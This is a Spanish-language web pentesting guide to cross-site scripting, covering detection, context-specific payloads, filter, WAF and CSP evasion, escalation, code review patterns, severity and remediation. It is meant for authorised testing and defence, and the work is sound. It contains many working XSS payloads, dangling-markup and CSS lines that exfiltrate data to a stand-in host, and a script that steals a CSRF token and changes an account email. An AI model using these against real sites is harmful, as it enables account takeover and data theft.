# Cross-Site Scripting (XSS)

| Clasificación | |
|---|---|
| CWE | CWE-79 — Neutralización incorrecta de la entrada durante la generación de la página web (Cross-site Scripting). Relacionadas: CWE-80, CWE-83, CWE-87 |
| OWASP Top 10:2025 | A05 — Injection |
| OWASP API Top 10:2023 | API8 — Security Misconfiguration (respuestas de API servidas como `text/html`, falta de cabeceras) |
| WSTG | WSTG-INPV-01 (reflejado), WSTG-INPV-02 (almacenado), WSTG-CLNT-01 (DOM), WSTG-CLNT-03 (inyección HTML), WSTG-CLNT-11 (web messaging) |

**Contenido:** 1. Qué es · 2. Dónde buscar · 3. Detección segura · 4. Explotación por contexto (HTML, atributo, JS, plantilla literal, URL, CSS, DOM, postMessage, mXSS, DOM clobbering, frameworks, XSS desde LLM) · 5. Evasión de filtros, WAF y CSP · 6. Escalada e impacto · 7. Caja blanca · 8. Falsos positivos · 9. Evidencia · 10. Severidad · 11. Remediación · 12. Herramientas · 13. Referencias

---

## 1. Qué es y por qué ocurre

El XSS consiste en conseguir que el navegador de una víctima ejecute JavaScript controlado por el atacante **dentro del origen** de la aplicación (el *origen* es la combinación esquema + host + puerto; todo lo que se ejecuta en él comparte cookies, almacenamiento y permisos). Ocurre cuando un dato no confiable llega a un **sumidero** (*sink*: el punto del código que interpreta ese dato como HTML, JavaScript o URL) sin la codificación adecuada para ese contexto.

Variantes:

- **Reflejado**: el valor viaja en la petición (parámetro, ruta, cabecera) y vuelve en la respuesta inmediata. Requiere que la víctima visite un enlace preparado.
- **Almacenado (persistente)**: el valor se guarda (comentario, perfil, nombre de fichero, ticket) y se sirve a otros usuarios. Mayor impacto: no requiere enlace y puede alcanzar a administradores.
- **Ciego (*blind*)**: variante almacenada cuya ejecución ocurre en una zona que el auditor no ve (panel de soporte, visor de logs, CRM). Se detecta con una carga que «llama a casa» a un servidor del auditor.
- **Basado en DOM**: el JavaScript del propio cliente lee una **fuente** (*source*: `location`, `postMessage`, `localStorage`…) y la escribe en un sumidero. El servidor puede no ver nunca la carga (por ejemplo, si va en el fragmento `#`).
- **Mutación (mXSS)**: el HTML aparentemente inocuo tras pasar por un saneador cambia de significado cuando el navegador lo vuelve a analizar.
- **XSS de segundo orden / vía LLM**: el dato llega al sumidero tras pasar por otro sistema (exportación CSV/PDF, respuesta de un modelo de lenguaje que se renderiza como HTML o Markdown).

La causa raíz casi siempre es una de estas: concatenar cadenas para construir HTML, desactivar el escapado automático del motor de plantillas, usar la codificación equivocada para el contexto (codificar como HTML algo que acaba dentro de JavaScript), o confiar en una lista negra de etiquetas.

## 2. Dónde buscar (señales del reconocimiento)

- Cualquier valor reflejado: búsquedas, mensajes de error, páginas 404/403 que repiten la ruta, paginación, parámetros `callback`, `redirect`, `lang`, `theme`.
- Contenido generado por usuarios: nombre, biografía, avatar (URL), comentarios, nombres de fichero subidos, metadatos EXIF, campos de soporte, direcciones, notas de pedido.
- Cabeceras que se muestran en paneles: `User-Agent`, `Referer`, `X-Forwarded-For` (candidatos a XSS ciego en paneles de analítica o logs).
- JavaScript del cliente: búsquedas de `innerHTML`, `document.write`, `eval`, `location =`, listeners `message`, routers de SPA que leen `location.hash`.
- Funcionalidades de importación/exportación (CSV, Markdown, SVG, HTML enriquecido, editores WYSIWYG).
- Respuestas de API JSON servidas con `Content-Type: text/html` o sin `X-Content-Type-Options: nosniff`.
- Ausencia o debilidad de `Content-Security-Policy` (revisar con `curl -sI`), cookies de sesión sin `HttpOnly`, tokens en `localStorage`.
- Bibliotecas antiguas detectadas en el reconocimiento: jQuery < 3.5, AngularJS 1.x, DOMPurify antiguo, editores como CKEditor/TinyMCE desactualizados.
- Chats y asistentes con LLM que renderizan Markdown/HTML (ver `vulns/llm-ai.md`).

## 3. Detección segura (primeras sondas, no destructivas)

1. **Marcador único** sin caracteres especiales para localizar reflejos: `crvs7x9q`. Buscarlo en la respuesta cruda (Burp) y en el DOM ya renderizado (DevTools), porque los reflejos DOM no aparecen en la respuesta.
2. **Sonda de caracteres** para saber qué filtra y cómo codifica: `crvs'"<>/\`${}()=;` y observar cada carácter (eliminado, codificado como entidad `&lt;`, escapado `\"`, o intacto).
3. **Determinar el contexto** exacto del reflejo (cuerpo HTML, valor de atributo con comillas dobles/simples/sin comillas, cadena JS, plantilla literal, URL, CSS, comentario, `<textarea>`/`<title>`).
4. **Carga mínima inocua** adaptada al contexto. Preferir `alert(document.domain)` (prueba el origen), `print()` o `console.log(document.domain)`.

> Nota: Chrome suprime `alert()` en iframes de origen cruzado y en pestañas en segundo plano. Si no aparece el diálogo, comprobar con `console.log`, `print()`, un cambio visible del DOM o una petición a un servidor propio (Burp Collaborator / interactsh).

5. **XSS ciego**: inyectar una carga con identificador único por campo que solo cargue un script desde un dominio del auditor (sin robar datos), por ejemplo `"><script src=https://<id-campo>.oast.example></script>`. ⚠️ Si el campo lo verán empleados reales del cliente, **requiere confirmación explícita del cliente**, y la carga solo debe registrar URL, `document.domain` y hora, nunca cookies ni contenido de la página.
6. **Almacenado**: probar únicamente con cuentas de prueba y en objetos propios; anotar cada carga para **eliminarla al terminar**. ⚠️ Cualquier carga almacenada visible para usuarios reales **requiere confirmación explícita del cliente**.

## 4. Explotación por contexto o tecnología

### 4.1 Cuerpo HTML

```html
<script>alert(document.domain)</script>
<img src=x onerror=alert(document.domain)>
<svg onload=alert(document.domain)>
<svg><animate onbegin=alert(document.domain) attributeName=x dur=1s>
<details open ontoggle=alert(document.domain)>
<body onpageshow=alert(document.domain)>
<input autofocus onfocus=alert(document.domain)>
<video><source onerror=alert(document.domain)>
<iframe srcdoc="<script>parent.alert(document.domain)</script>">
<math><mtext><img src=x onerror=alert(document.domain)>
<xss id=x tabindex=1 onfocus=alert(document.domain)></xss>   <!-- añadir #x a la URL -->
<button popovertarget=p>clic</button><xss ontoggle=alert(document.domain) popover id=p>
```

Si el reflejo cae dentro de elementos de texto «crudo» hay que cerrarlos primero:

```html
</title><img src=x onerror=alert(1)>
</textarea><img src=x onerror=alert(1)>
</style><img src=x onerror=alert(1)>
</noscript><img src=x onerror=alert(1)>
--><img src=x onerror=alert(1)>          <!-- dentro de un comentario HTML -->
]]><img src=x onerror=alert(1)>          <!-- dentro de CDATA en SVG/XML -->
```

### 4.2 Atributo HTML

```html
" autofocus onfocus=alert(document.domain) x="
' autofocus onfocus=alert(document.domain) x='
x onmouseover=alert(document.domain)                  <!-- atributo sin comillas -->
"><img src=x onerror=alert(document.domain)>          <!-- si < y > no se filtran -->
" style="animation-name:spin" onanimationstart="alert(1)   <!-- si existe una @keyframes en la página -->
```

Casos especiales:

```html
<!-- input type=hidden (Chrome moderno) -->
<input type=hidden name=q value="" oncontentvisibilityautostatechange=alert(1) style=content-visibility:auto x="">
<!-- input hidden / link canonical: accesskey + onclick (requiere Alt+Shift+X o equivalente) -->
" accesskey="x" onclick="alert(1)
<!-- href/src/action/formaction: el valor ya es una URL -->
javascript:alert(document.domain)
```

Si los caracteres se codifican como entidades HTML **dentro de un manejador de eventos** (`onclick="f('VALOR')"`), el navegador decodifica las entidades antes de ejecutar el JS, así que `&apos;-alert(1)-&apos;` o `&#39;);alert(1);//` rompen la cadena aunque `'` esté «escapado».

### 4.3 Cadena JavaScript

```javascript
'-alert(document.domain)-'
';alert(document.domain);//
\';alert(document.domain);//          // si la aplicación escapa ' pero no \
"-alert(document.domain)-"
</script><img src=x onerror=alert(document.domain)>   // el analizador HTML cierra el script antes que el de JS
```

Dentro de JSON incrustado en HTML (`<script>var data = {"q":"VALOR"}</script>`) la ruptura habitual es `</script>`, porque `JSON.stringify` no escapa `<`.

### 4.4 Plantilla literal (template literal) de JavaScript

```javascript
${alert(document.domain)}
`;alert(document.domain);//
```

### 4.5 Contexto URL (href, src, location)

```text
javascript:alert(document.domain)
JaVaScRiPt:alert(document.domain)
java%0ascript:alert(1)           // tabulador/salto de línea dentro del esquema: el navegador los elimina
&#106;avascript:alert(1)          // entidades en atributo href
javascript://%0aalert(1)          // comentario JS + salto de línea, pasa filtros que exigen "//"
javascript:alert(1)//https://legit.example
data:text/html,<script>alert(1)</script>   // bloqueado como navegación de nivel superior en navegadores modernos; útil en iframe/objeto
```

### 4.6 Contexto CSS

Raramente da ejecución en navegadores actuales (`expression()` solo existía en IE), pero sí permite **salir del bloque** o **exfiltrar** con selectores:

```html
</style><img src=x onerror=alert(1)>
```
```css
input[name=csrf][value^=a]{background:url(https://oast.example/a)}
```

### 4.7 XSS basado en DOM: fuentes y sumideros

| Fuentes habituales | Sumideros HTML | Sumideros JS | Sumideros URL/navegación |
|---|---|---|---|
| `location.search/hash/pathname/href`, `document.URL`, `document.referrer`, `window.name`, `postMessage` (`event.data`), `localStorage`/`sessionStorage`, `document.cookie`, respuestas de API reflejadas, `URLSearchParams` | `innerHTML`, `outerHTML`, `insertAdjacentHTML`, `document.write/writeln`, `Range.createContextualFragment`, `DOMParser` + inserción, jQuery `.html() .append() .prepend() .after() .before() .replaceWith() $()`, `iframe.srcdoc` | `eval`, `Function()`, `setTimeout/setInterval` con cadena, `script.text/textContent/src`, `import()` dinámico | `location = …`, `location.href/assign/replace`, `window.open`, `a.href`, `form.action`, `iframe.src`, `script.src` |

Cargas típicas:

```text
https://t.example/#<img src=x onerror=alert(document.domain)>
https://t.example/?q=<img src=x onerror=alert(1)>          # innerHTML no ejecuta <script>, usar manejadores
https://t.example/?next=javascript:alert(document.domain)    # sumidero location
https://t.example/#"><svg onload=alert(1)>                  # jQuery $(location.hash) en versiones < 1.9
```

`window.name` persiste entre navegaciones: desde una página propia `window.name='<img src=x onerror=alert(1)>'; location='https://t.example/vulnerable'`.

### 4.8 Mensajería web (postMessage)

Buscar `addEventListener('message'` / `onmessage` sin validar `event.origin` o con validaciones débiles (`indexOf`, `includes`, `startsWith('https://t.example')` que acepta `https://t.example.evil.com`, regex sin escapar el punto).

```html
<!-- PoC alojada en dominio del auditor -->
<iframe id=f src="https://t.example/pagina-con-listener" onload="
  f.contentWindow.postMessage('<img src=x onerror=alert(document.domain)>','*')"></iframe>
<!-- si la página prohíbe ser enmarcada: -->
<script>
w = window.open('https://t.example/pagina-con-listener');
setTimeout(()=>w.postMessage({type:'render',html:'<img src=x onerror=alert(document.domain)>'},'*'),2000);
</script>
```

Revisar también la dirección inversa: `postMessage(datosSensibles, '*')` filtra tokens a cualquier ventana que abra o enmarque la página.

### 4.9 XSS por mutación (mXSS) y saneadores

El saneador analiza el HTML en un árbol, lo limpia y lo serializa; al reinsertarlo, el navegador lo vuelve a analizar en otro contexto (espacio de nombres SVG/MathML, `<noscript>`, tablas) y aparece un elemento activo. Cargas históricas útiles para comprobar saneadores caseros o versiones viejas:

```html
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
<svg></p><style><a id="</style><img src=1 onerror=alert(1)>">
<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;/mglyph&gt;&lt;img&Tab;src=1&Tab;onerror=alert(1)&gt;">
<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>
```

DOMPurify tuvo bypasses publicados en 2024 (por ejemplo CVE-2024-45801 y CVE-2024-47875); comprobar la versión exacta y su configuración (`SAFE_FOR_TEMPLATES`, `ADD_TAGS`, `ALLOW_UNKNOWN_PROTOCOLS`). Un saneador correcto se anula si después el código **modifica** la cadena saneada (reemplazos, concatenación, decodificación de entidades).

### 4.10 DOM clobbering

Cuando no se puede ejecutar script (saneador que permite `id`/`name`), se pueden crear elementos con `id` o `name` que sobrescriben variables globales que el código usa después:

```html
<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">
<form id=config><input name=url value="https://oast.example/x.js"></form>   <!-- window.config.url -->
<img name=getElementById>                                                   <!-- rompe document.getElementById -->
<form onclick=alert(1)><input id=attributes>                                <!-- clobbering de .attributes contra saneadores -->
```

### 4.11 Frameworks

**React / Next.js**
```jsx
<div dangerouslySetInnerHTML={{__html: userInput}} />     // sumidero directo
<a href={userUrl}>perfil</a>                               // javascript: (React avisa desde 16.9; versiones recientes lo bloquean: comprobar versión)
<Comp {...userControlledProps} />                         // si el atacante controla las props
// SSR: estado serializado sin escapar
<script>window.__STATE__ = ${JSON.stringify(state)}</script>   // carga: </script><img src=x onerror=alert(1)>
ref.current.innerHTML = userInput                           // fuera del control de React
```

**Angular (2+)**: `[innerHTML]` se sanea automáticamente; el riesgo está en `bypassSecurityTrustHtml/Url/Script/ResourceUrl`, en `ElementRef.nativeElement.innerHTML`, y en **inyección de plantillas** cuando el servidor concatena entrada del usuario en una plantilla que Angular compila.

**AngularJS (1.x)**: si la entrada se refleja dentro de un elemento con `ng-app` (aunque `<` esté codificado), hay inyección de plantilla en cliente. Desde 1.6 no hay sandbox:
```text
{{constructor.constructor('alert(document.domain)')()}}
{{$on.constructor('alert(1)')()}}
<input autofocus ng-focus=$event.composedPath()|orderBy:'(z=alert)(1)'>   <!-- con ng-csp / CSP -->
```

**Vue**: `v-html`; plantillas «en DOM» o compiladas en tiempo de ejecución que contienen entrada del usuario:
```text
{{_c.constructor('alert(1)')()}}            Vue 2
{{_openBlock.constructor('alert(1)')()}}    Vue 3
{{$emit.constructor`alert(1)`()}}           Vue 2/3
```
Además `:href="userUrl"` con `javascript:`, y `v-bind` de objetos completos controlados por el usuario.

**Otros**: Svelte `{@html}`, Astro `set:html`, Lit `unsafeHTML`, Ember `htmlSafe`/`{{{ }}}`, Handlebars `{{{ }}}`, renderizadores Markdown con HTML habilitado (`marked`, `markdown-it` con `html:true`, `react-markdown` con `rehype-raw`): `[clic](javascript:alert(1))`, `<img src=x onerror=alert(1)>`.

### 4.12 Otros vectores

- **SVG subido**: `<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>` servido desde el mismo origen (ver `vulns/file-upload.md`).
- **Respuestas JSON/JSONP** con `Content-Type: text/html`: `/api/user?callback=<img src=x onerror=alert(1)>`.
- **Errores de servidor** que reflejan cabeceras o rutas sin codificar.
- **PDF/HTML-to-PDF**: XSS que se ejecuta en el renderizador del servidor puede escalar a SSRF o lectura de ficheros (ver `vulns/ssrf.md`).
- **Contaminación de prototipos** que alimenta un sumidero (ver `vulns/prototype-pollution.md`).
- **Salida de LLM** renderizada como HTML/Markdown: inyección indirecta de prompt que hace emitir `<img src=x onerror=…>` o imágenes Markdown que exfiltran datos (ver `vulns/llm-ai.md`).

### 4.13 Políglotas (contexto desconocido)

```text
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
'"--></style></script><svg onload=alert(document.domain)>
```

## 5. Evasión de filtros y WAF

**Etiquetas y atributos poco comunes**
```html
<svg/onload=alert(1)>
<svg%0Aonload=alert(1)>
<img/src/onerror=alert(1)>
<style>@keyframes k{}</style><xss style=animation-name:k onanimationend=alert(1)>
<xss onpointerover=alert(1) style=display:block>XXX</xss>
<marquee onstart=alert(1)>          <!-- según navegador -->
<a href="j&Tab;avascript&colon;alert&lpar;1&rpar;">clic</a>
```

**Sin paréntesis**
```javascript
alert`1`
onerror=alert;throw 1
{onerror=alert}throw 1
throw onerror=alert,1
location='javascript:alert%281%29'
```

**Sin la palabra `alert` ni cadenas evidentes**
```javascript
top['al'+'ert'](1)
self[atob('YWxlcnQ=')](document.domain)
window[/al/.source+/ert/.source](1)
[].constructor.constructor('alert(1)')()
Function`a${atob`YWxlcnQoMSk=`}```
eval(String.fromCharCode(97,108,101,114,116,40,49,41))
import('//oast.example/x.js')
alert(1)                         // escapes unicode válidos en identificadores
```

**Codificación**: entidades HTML en atributos (`&#x61;lert(1)`), doble codificación URL cuando hay doble decodificación entre capas (`%253Csvg%253E`), Unicode de ancho completo si el backend normaliza NFKC (`＜svg onload=alert(1)＞`), y separadores alternativos (`/`, `%09`, `%0A`, `%0C`, `%0D`) entre nombre de etiqueta y atributo.

**Filtros que eliminan una vez** (no recursivos): `<scr<script>ipt>alert(1)</script>`.

**Contaminación de parámetros** para que el WAF inspeccione un valor y la aplicación use otro (ver `vulns/parameter-pollution.md` y `vulns/waf-bypass.md`).

### 5.1 Evasión de CSP (Content-Security-Policy)

Leer la política (`curl -sI`, o `<meta http-equiv>`), y pasarla por CSP Evaluator. Debilidades explotables:

| Debilidad | Cómo explotarla |
|---|---|
| `'unsafe-inline'` en `script-src` | Cualquier carga inline funciona |
| `'unsafe-eval'` | Gadgets que evalúan cadenas (AngularJS, `setTimeout('…')`) |
| `data:` o `*` en `script-src` | `<script src="data:,alert(1)"></script>` |
| Dominios permitidos con JSONP o bibliotecas antiguas | `<script src="https://permitido.example/jsonp?callback=alert"></script>`; AngularJS desde un CDN permitido + `ng-app` |
| `'self'` y posibilidad de subir ficheros o respuestas JSON reflejadas con tipo JS | Subir `x.js` / usar endpoint que devuelva texto controlado |
| Falta `base-uri` | `<base href="https://oast.example/">` secuestra scripts relativos (incluso con nonce) |
| Falta `object-src` | `<object data=…>` en navegadores/plug-ins heredados |
| Falta `form-action` | Secuestro de formularios hacia dominio del auditor |
| Nonce estático, reutilizado o en página cacheada | Reutilizar el nonce observado |
| `'strict-dynamic'` + gadgets de script | Código legítimo que crea `<script>` a partir de datos del DOM (`data-src`, `data-main`) |
| Política reflejada desde un parámetro | Inyectar `;script-src-elem 'unsafe-inline'` (Chrome) o `;report-uri …` |
| Solo `Content-Security-Policy-Report-Only` | No bloquea nada |

```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.3/angular.min.js"></script>
<div ng-app ng-csp>{{$on.constructor('alert(document.domain)')()}}</div>
```

**Marcado colgante (*dangling markup*)**: si se puede inyectar HTML pero no ejecutar script, una etiqueta abierta «se come» el resto de la página hasta la siguiente comilla y envía el contenido (por ejemplo, un token CSRF) a un servidor externo:

```html
<img src='https://oast.example/?   <!-- Chrome bloquea URLs con salto de línea y '<'; probar alternativas -->
<a href=https://oast.example/><font size=100>clic</font></a><base target='   <!-- el resto acaba en window.name -->
<form action=https://oast.example/><button>clic</button><textarea name=x>
<meta http-equiv="refresh" content='0;URL=https://oast.example/?
```

## 6. Escalada y encadenamiento (demostrar impacto máximo sin causar daño)

Principio: demostrar **lo que podría hacerse** con el menor efecto real. Usar siempre cuentas de prueba propias como víctima.

1. **Prueba de origen**: `alert(document.domain)` + captura de pantalla. Suficiente para reflejado básico.
2. **Lectura de datos de la propia cuenta de prueba** (demuestra confidencialidad):
   ```javascript
   fetch('/api/me',{credentials:'include'}).then(r=>r.text()).then(t=>console.log(t.slice(0,200)))
   ```
   Si hay que demostrar exfiltración, enviar solo un dato no sensible (por ejemplo, el nombre de la cuenta de prueba) a un servidor propio.
3. **Cookies**: si la cookie de sesión no tiene `HttpOnly`, `console.log(document.cookie)` lo prueba; no enviarla fuera. Si tiene `HttpOnly`, el impacto sigue siendo total porque el script actúa *como* el usuario.
4. **Tokens en almacenamiento**: `Object.keys(localStorage)` (mostrar solo nombres de claves; nunca exfiltrar JWT reales).
5. **Robo de token CSRF y acción en nombre del usuario** (toma de cuenta). ⚠️ Cambia datos: **requiere confirmación explícita del cliente**; ejecutarlo solo contra la cuenta de prueba del auditor:
   ```javascript
   fetch('/settings').then(r=>r.text()).then(h=>{
     const t = h.match(/name="csrf" value="([^"]+)"/)[1];
     return fetch('/settings/email',{method:'POST',credentials:'include',
       headers:{'Content-Type':'application/x-www-form-urlencoded'},
       body:'csrf='+t+'&email=auditor%2Bprueba@dominio-auditor.example'});
   });
   ```
6. **Escalada a administrador**: un XSS almacenado o ciego que se ejecuta en un panel interno permite crear usuarios o cambiar roles. Demostrarlo solo con `document.domain` + URL del panel registrada por la carga ciega; no ejecutar acciones administrativas sin autorización explícita.
7. **Persistencia**: registro de *service worker* (si se puede servir un script propio desde el mismo origen) o envenenamiento de caché (ver `vulns/cache-poisoning-deception.md`). Solo describir; no desplegar.
8. **Cadenas**: auto-XSS + CSRF de inicio de sesión (*login CSRF*) o + clickjacking = XSS explotable; XSS en subdominio hermano → saltar `SameSite` y CORS confiado en subdominios (ver `vulns/csrf.md`, `vulns/cors.md`); open redirect con `javascript:` en redirecciones del cliente (ver `vulns/open-redirect.md`).

Al terminar: borrar las cargas almacenadas, revocar sesiones de las cuentas de prueba y anotarlo en el informe.

## 7. Caja blanca: fuentes, sumideros y patrones de código

**Plantillas de servidor: escapado desactivado**

| Tecnología | Vulnerable | Seguro |
|---|---|---|
| PHP | `echo $_GET['q'];` | `echo htmlspecialchars($q, ENT_QUOTES \| ENT_SUBSTITUTE, 'UTF-8');` |
| Laravel Blade | `{!! $q !!}` | `{{ $q }}` |
| Twig / Jinja2 | `{{ q\|raw }}`, `{{ q\|safe }}`, `{% autoescape false %}`, `Markup(q)` | `{{ q }}` con autoescape |
| Django | `mark_safe(q)`, `{% autoescape off %}`, `format_html` mal usado | `{{ q }}`, `format_html('{}', q)` |
| Rails | `raw(q)`, `q.html_safe`, `<%== q %>` | `<%= q %>` |
| EJS / Pug / Handlebars | `<%- q %>`, `!{q}`, `{{{ q }}}` | `<%= q %>`, `#{q}`, `{{ q }}` |
| Thymeleaf | `th:utext="${q}"` | `th:text="${q}"` |
| JSP | `<%= q %>`, `${q}` sin `c:out`, `escapeXml="false"` | `<c:out value="${q}"/>`, `fn:escapeXml` |
| Razor (.NET) | `@Html.Raw(q)` | `@q` |
| Go | `text/template` para HTML, `template.HTML(q)` | `html/template` |

Ojo con la **codificación según contexto**: `htmlspecialchars` no protege dentro de `<script>var x='…'</script>` ni en `href` (no bloquea `javascript:`). Para JS embebido usar `json_encode($x, JSON_HEX_TAG|JSON_HEX_APOS|JSON_HEX_QUOT|JSON_HEX_AMP)` o atributos `data-*`.

**Cliente**

```javascript
// Vulnerable
el.innerHTML = new URLSearchParams(location.search).get('q');
$('#out').html(location.hash.slice(1));
window.addEventListener('message', e => { div.innerHTML = e.data.html; });
location = params.get('next');
// Seguro
el.textContent = q;
el.innerHTML = DOMPurify.sanitize(q);           // si de verdad se necesita HTML
window.addEventListener('message', e => {
  if (e.origin !== 'https://app.example') return;
  div.textContent = String(e.data.text);
});
const u = new URL(next, location.origin); if (u.origin === location.origin) location = u;
```

**Consultas ripgrep**

```bash
# Sumideros DOM y de frameworks
rg -n --glob '!node_modules' --glob '!*.min.js' \
  'innerHTML\s*[+]?=|outerHTML\s*=|insertAdjacentHTML|document\.write|createContextualFragment|srcdoc|dangerouslySetInnerHTML|v-html|\{@html|set:html|unsafeHTML|bypassSecurityTrust|\.html\(|eval\(|new Function\(|setTimeout\(\s*["'\'']'
# Listeners postMessage (revisar a mano la validación de origin)
rg -n "addEventListener\(\s*['\"]message['\"]|onmessage\s*=" -g '*.{js,ts,jsx,tsx,vue,svelte}'
# Escapado desactivado en plantillas de servidor
rg -n '\{!!|\|\s*raw\b|\|\s*safe\b|mark_safe|autoescape\s+(false|off)|html_safe|raw\(|<%==|<%-|\{\{\{|th:utext|Html\.Raw|template\.HTML\(|escapeXml="false"'
# Reflejo directo en PHP
rg -n 'echo\s+\$_(GET|POST|REQUEST|COOKIE|SERVER)|print\s+\$_(GET|POST|REQUEST)'
```

**Semgrep**

```bash
semgrep --config p/xss --config p/react --config p/javascript .
```

Regla propia para `postMessage` sin comprobación de origen:

```yaml
rules:
- id: postmessage-sin-origin
  languages: [javascript, typescript]
  severity: WARNING
  message: Listener de postMessage sin validar event.origin
  patterns:
    - pattern: window.addEventListener("message", ($E) => { ... })
    - pattern-not: |
        window.addEventListener("message", ($E) => { ... $E.origin ... })
```

## 8. Falsos positivos frecuentes

- El marcador aparece en la respuesta pero dentro de un contexto inerte (JSON con `Content-Type: application/json` y `nosniff`, atributo correctamente codificado, `<textarea>` con `</` codificado).
- Respuesta reflejada en una página que el navegador no renderiza (descarga, `Content-Disposition: attachment`).
- **Auto-XSS**: solo se ejecuta si la víctima pega la carga ella misma; sin cadena (CSRF, login CSRF, clickjacking) no es explotable.
- El escáner informa por ver `<script>` en la respuesta, pero la CSP bloquea la ejecución: comprobar la consola del navegador.
- Reflejo solo en una cabecera que el navegador de la víctima no puede controlar (por ejemplo, `User-Agent` reflejado en la misma respuesta) sin almacenamiento ni caché.
- `alert()` no aparece por estar en iframe cruzado: no es un negativo, verificar con `console.log`.
- Ejecución en un dominio aislado de contenido de usuario (*sandbox domain*, p. ej. `usercontent.example`) sin cookies ni acceso al origen principal: el impacto es mínimo.

## 9. Evidencia mínima para validarlo

- Petición HTTP completa (o URL) que dispara la ejecución y respuesta con el reflejo resaltado; para DOM, el fragmento de código fuente → sumidero.
- Captura del navegador con `document.domain` del objetivo (no de un dominio de *sandbox*).
- Navegador y versión usados, y si la CSP estaba presente.
- Para almacenado/ciego: dónde se insertó, quién lo visualiza (rol), registro de la llamada recibida (hora, URL, IP) y confirmación de que se eliminó la carga.
- Para impacto ampliado: demostración sobre la cuenta de prueba (petición generada por el script y su resultado).

## 10. Severidad orientativa (vectores CVSS 3.1 y 4.0 típicos según impacto demostrado)

| Escenario | CVSS 3.1 | CVSS 4.0 (calcular puntuación con la calculadora de FIRST) |
|---|---|---|
| Reflejado / DOM, impacto limitado | `AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N` = 6.1 | `AV:N/AC:L/AT:N/PR:N/UI:A/VC:N/VI:N/VA:N/SC:L/SI:L/SA:N` |
| Almacenado, requiere cuenta | `AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N` = 5.4 | `AV:N/AC:L/AT:N/PR:L/UI:P/VC:N/VI:N/VA:N/SC:L/SI:L/SA:N` |
| Reflejado con toma de cuenta demostrada | `AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N` = 9.3 (con `S:U`: 8.1) | `AV:N/AC:L/AT:N/PR:N/UI:A/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N` |
| Almacenado/ciego que compromete a administradores | `AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N` = 8.7 | `AV:N/AC:L/AT:N/PR:L/UI:P/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N` |
| Auto-XSS sin cadena | Informativo | Informativo |

En CVSS 4.0 la especificación pone el XSS reflejado como ejemplo de `UI:A` (interacción activa: visitar el enlace preparado) y el almacenado como `UI:P` (pasiva: basta con ver la página). El navegador de la víctima suele tratarse como sistema subsiguiente (`SC/SI`); si se demuestra toma de la cuenta en la propia aplicación, puede justificarse `VC/VI` altos.

Ajustes: `AC:H` si hace falta una condición de carrera o configuración no por defecto; `AT:P` en 4.0 si depende de una condición del entorno; bajar si la cookie es `HttpOnly` **y** no hay acciones sensibles accesibles; subir si se demuestra robo de token persistente o propagación (gusano).

## 11. Remediación (con ejemplo de código correcto)

1. **Codificación de salida según contexto** con el motor de plantillas (autoescape activado) y sin APIs «raw».
2. **Evitar sumideros peligrosos** en el cliente: `textContent`, `setAttribute` sobre atributos no ejecutables, `createElement`.
3. **Si hay que aceptar HTML**, sanear con DOMPurify actualizado (o la Sanitizer API `Element.setHTML()` donde el navegador objetivo la soporte; su especificación se rediseñó en 2024–2025, verificar compatibilidad) y no modificar el resultado después.
4. **Validar URLs** por esquema (`http:`/`https:` en lista blanca) antes de usarlas en `href`/`src`/`location`.
5. **CSP estricta** basada en nonce o hash + `strict-dynamic`, más **Trusted Types**:
   ```text
   Content-Security-Policy: script-src 'nonce-{aleatorio-por-respuesta}' 'strict-dynamic'; object-src 'none'; base-uri 'none'; frame-ancestors 'self'; require-trusted-types-for 'script'
   ```
6. **Cookies** `HttpOnly; Secure; SameSite=Lax` (o `Strict`) y no guardar tokens de larga duración en `localStorage`.
7. `X-Content-Type-Options: nosniff` y `Content-Type` correcto en APIs (`application/json`).
8. Validar `event.origin` con igualdad exacta en todo listener de `postMessage`.

```javascript
// Express + plantilla segura + CSP con nonce
import crypto from 'node:crypto';
app.use((req, res, next) => {
  res.locals.nonce = crypto.randomBytes(16).toString('base64');
  res.set('Content-Security-Policy',
    `script-src 'nonce-${res.locals.nonce}' 'strict-dynamic'; object-src 'none'; base-uri 'none'`);
  next();
});
// En la vista (EJS): <%= q %> (escapa)  y  <script nonce="<%= nonce %>">…</script>
```

```jsx
// React: renderizar HTML de usuario solo saneado
import DOMPurify from 'dompurify';
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(html, { USE_PROFILES: { html: true } }) }} />
// URLs
const safeHref = /^https?:\/\//i.test(url) ? url : '#';
```

## 12. Herramientas (comando y cuándo usarla; automatización solo tras confirmación manual, nunca como primer barrido)

| Herramienta | Uso | Cuándo |
|---|---|---|
| Burp Suite (Repeater, Intruder) | Probar contextos y caracteres a mano | Siempre, primero |
| DOM Invader (navegador de Burp) | Rastrear fuentes → sumideros, postMessage, prototype pollution | XSS DOM y SPA |
| DevTools | Breakpoints en sumideros, `Sources > Search` de `innerHTML` | DOM |
| CSP Evaluator (csp-evaluator.withgoogle.com) | Analizar la política | Al encontrar CSP |
| Burp Collaborator / `interactsh-client` | Servidor OAST para XSS ciego y exfiltración controlada | Ciego |
| XSS Hunter (versión autoalojada, p. ej. xsshunter-express) | Recoger ejecuciones ciegas con captura | Ciego, con autorización |
| `dalfox` | `dalfox url "https://t.example/s?q=x" -b https://<id>.oast.example` / `dalfox file urls.txt` | Tras confirmar un parámetro reflejado, para variar cargas |
| `kxss` | `cat urls.txt \| kxss` — qué caracteres sobreviven en cada parámetro | Triaje de muchas URLs |
| XSStrike | `python3 xsstrike.py -u "https://t.example/s?q=x"` | Fuzzing de contexto/filtros |
| `semgrep` / `rg` | Ver sección 7 | Caja blanca |

Respetar límites de tasa acordados; los escáneres generan cargas almacenadas reales si se apuntan a formularios: no usarlos sobre funciones de escritura en producción sin acuerdo.

## 13. Referencias

